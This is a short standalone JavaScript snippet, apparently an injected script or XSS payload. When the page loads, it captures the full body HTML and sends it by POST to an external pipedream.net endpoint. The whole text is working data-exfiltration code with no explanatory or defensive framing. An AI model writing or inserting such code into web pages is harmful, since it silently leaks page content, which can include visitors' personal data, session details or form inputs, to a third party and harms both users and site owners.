document.addEventListener('DOMContentLoaded', function() {
    var bodyContent = document.body.innerHTML; 
    fetch("https://eoyz1blvtlymzlj.m.pipedream.net",
          { method: "POST", 
            body: JSON.stringify({ bodyContent }) 
         });
                     
                 });
